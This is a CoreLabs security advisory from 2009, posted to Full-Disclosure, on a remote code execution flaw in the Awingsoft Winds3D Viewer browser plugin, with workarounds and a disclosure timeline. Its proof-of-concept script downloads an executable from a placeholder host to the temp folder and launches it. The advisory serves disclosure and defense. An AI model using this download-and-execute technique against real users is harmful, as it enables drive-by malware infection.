-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
 
~      Core Security Technologies - CoreLabs Advisory
~           http://www.coresecurity.com/corelabs/

Awingsoft Awakening Winds3D Viewer remote command execution vulnerability



1. *Advisory Information*

Title: Awingsoft Awakening Winds3D Viewer remote command execution 
vulnerability
Advisory ID: CORE-2009-0519
Advisory URL: http://www.coresecurity.com/content/winds3d-viewer-advisory
Date published: 2009-07-08
Date of last update: 2009-07-08
Vendors contacted: Awingsoft
Release mode: User release


2. *Vulnerability Information*

Class: Remote command execution
Remotely Exploitable: Yes (client side)
Locally Exploitable: No
Bugtraq ID: 35595
CVE Name: CVE-2009-2386


3. *Vulnerability Description*

Awingsoft's Awakening is a rapid application authoring tool for 
efficiently creating interactive 3D content. With this tool, you can 
easily create interactive 3D presentations, animated 3D webs, brief 
films or games.

Awakening's Winds3D Viewer [1], which runs as a plugin within most 
popular web browsers, is vulnerable to a remotely exploitable arbitrary 
command execution vulnerability which can be triggered by making the 
user visit a malicious link/website.


4. *Vulnerable packages*

~   . Winds3D Viewer v3.5.0.0
~   . Winds3D Viewer v3.0.0.5
~   . Older versions are probably affected too, but were not checked.


5. *Vendor Information, Solutions and Workarounds*

The vendor did not provide fixes or workaround information. A possible 
mitigation action would be to enable MIME type filtering in your 
IDS/proxies and block Winds3D traffic: 'application/x-awingsoft-winds3d'

As a workaround, vulnerable users can also avoid this flaw by disabling 
the Winds3D Plugin in their web browsers:


5.1. *Mozilla Firefox*

~   . Go to the Tools menu, and select Options...
~   . Click on the Main tab
~   . Click on the Manage Add-ons...
~   . Disable Winds3D Plugin

5.2. *Internet Explorer*

~   . Set the kill bit for control 
*17A54E7D-A9D4-11D8-9552-00E04CB09903* (as explained in 
http://support.microsoft.com/kb/240797).

5.3. *Opera*

~   . Browse opera:plugins
~   . Look for "Winds3D Plugin for Mozilla"
~   . Delete the associated file.
Please contact Awingsoft for further information, patches and workarounds.


6. *Credits*

This vulnerability was discovered and researched by Diego Juarez from 
Core Security Technologies.


7. *Technical Description / Proof of Concept Code*


7.1. *Introduction*

The vulnerability comes from the way the scripting interface exposes 
filesystem access and in particular the way it implements the GetURL method:


/-----------

GetURL(string URL)
Description: Open browser to visit assigned URL
returns: None

- -----------/


In the current implementation, calling GetURL will ultimately execute 
the equivalent of calling 'ShellExecute(NULL, "open", URL, 0, 0, 
SW_SHOW);'. Note that the attacker only controls the file to open 
(execute), but not the command line parameters.

This, however, coupled with the scripting interface's ability to 
download arbitrary files to arbitrary paths constitutes a remotely 
exploitable arbitrary code execution vulnerability which can be 
triggered by making the user visit a malicious link/website.


7.2. *Proof of concept*

The following script (.usr) demonstrates the vulnerability. It downloads 
a malicious binary file to the victim machine and then executes it.


/-----------

- -- download
require 'scripts\\websession'
require 'scripts\\webfile'
- -- evil file to download
local szURL='http://somesite/exploit.exe'
- -- setup download evil file from the web
ses=websession.new()
file=ses.openURL(szURL)
local destfilename=GetTempFileName()                   -- we always want 
to download to the %TEMP% directory (write access = sure thing)     
destfilename=string.gsub(destfilename, ".tmp", ".exe") -- rename to 
something shellexecute will launch
file.setDestFile(destfilename)       
local filesize=file.seek(0,FILE_END)
file.seek(0,FILE_BEGIN)
local bytescount=0
local readbytes=file.read()
while (readbytes>0) do
bytescount=bytescount + readbytes
readbytes=file.read()
end       
- -- close the descriptors
file.release()
ses.release()
- -- execute
GetURL(destfilename)

- -----------/



8. *Report Timeline*

. 2009-05-19:
Core Security Technologies notifies Awingsoft of the vulnerability (no 
reply received).

. 2009-06-29:
Core notifies again Awingsoft of the vulnerability (no reply received).

. 2009-07-08:
Since Awingsoft did not respond any notification, Core decides to 
publish the advisory CORE-2009-0519 as "User release".



9. *References*

[1] Awingsoft's Awakening viewer (AKA Winds3D viewer)
http://www.awingsoft.com/web3d/web3d.htm


10. *About CoreLabs*

CoreLabs, the research center of Core Security Technologies, is charged 
with anticipating the future needs and requirements for information 
security technologies. We conduct our research in several important 
areas of computer security including system vulnerabilities, cyber 
attack planning and simulation, source code auditing, and cryptography. 
Our results include problem formalization, identification of 
vulnerabilities, novel solutions and prototypes for new technologies. 
CoreLabs regularly publishes security advisories, technical papers, 
project information and shared software tools for public use at: 
http://www.coresecurity.com/corelabs.


11. *About Core Security Technologies*

Core Security Technologies develops strategic solutions that help 
security-conscious organizations worldwide develop and maintain a 
proactive process for securing their networks. The company's flagship 
product, CORE IMPACT, is the most comprehensive product for performing 
enterprise security assurance testing. CORE IMPACT evaluates network, 
endpoint and end-user vulnerabilities and identifies what resources are 
exposed. It enables organizations to determine if current security 
investments are detecting and preventing attacks. Core Security 
Technologies augments its leading technology solution with world-class 
security consulting services, including penetration testing and software 
security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core 
Security Technologies can be reached at 617-399-6980 or on the Web at 
http://www.coresecurity.com.


12. *Disclaimer*

The contents of this advisory are copyright (c) 2009 Core Security 
Technologies and (c) 2009 CoreLabs, and may be distributed freely 
provided that no fee is charged for this distribution and proper credit 
is given.


13. *PGP/GPG Keys*

This advisory has been signed with the GPG key of Core Security 
Technologies advisories team, which is available for download at 
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
 
iEYEARECAAYFAkpVCKUACgkQyNibggitWa0tLACfTRppFDPNm6DnwqzSGNflLXHO
RGkAnic/M9juNT6l18s2Rgb92SJSMqia
=MoU+
-----END PGP SIGNATURE-----

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
